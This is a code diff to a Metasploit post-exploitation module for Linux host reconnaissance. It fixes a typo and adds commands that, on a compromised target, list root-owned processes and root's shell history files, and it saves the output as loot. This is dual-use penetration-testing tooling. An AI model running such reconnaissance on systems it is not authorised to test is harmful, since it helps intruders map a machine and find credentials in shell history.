@@ -89,7 +89,7 @@ class MetasploitModule < Msf::Post
 #
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'linux hostrecon post-module (fingeprints)',
+                        'Name'          => 'linux hostrecon post-module (fingerprints)',
                         'Description'   => %q{
                                         This module gathers target system information (linux distros), display outputs and stores it into a logfile in msf4/loot folder. this module also allows users to execute a single_command in bash + read/store outputs (advanced options).
                         },
@@ -216,6 +216,7 @@ def run
       distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
       shell_used = cmd_exec("echo $0")
       shell_system = cmd_exec("echo \"$SHELL\"")
+      root_services = cmd_exec("ps -aux | grep '^root'")
         #
         # store data into an variable to write logfile and display outputs ..
         #
@@ -245,6 +246,10 @@ def run
         data_dump << "----------------"
         data_dump << distro_shells
         data_dump << ""
+        data_dump << "ROOT SERVICES RUNNING:"
+        data_dump << "----------------"
+        data_dump << root_services
+        data_dump << ""
         Rex::sleep(0.5)
 
         #
@@ -256,6 +261,7 @@ def run
           #
           # bash commands to be executed remotelly ..
           #
+          distro_history = cmd_exec("ls -la /root/.*_history")
           distro_packages = cmd_exec("/usr/bin/dpkg -l")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
           # Store interface in use (remote)
@@ -270,6 +276,10 @@ def run
             data_dump << "LIST OF LOGFILES FOUND:"
             data_dump << "-----------------------"
             data_dump << distro_logs
+            data_dump << ""
+            data_dump << "LIST OF HISTORY FILES:"
+            data_dump << "-----------------------"
+            data_dump << distro_history
             data_dump << ""
             data_dump << "LIST OF PACKAGES FOUND:"
             data_dump << "-----------------------"
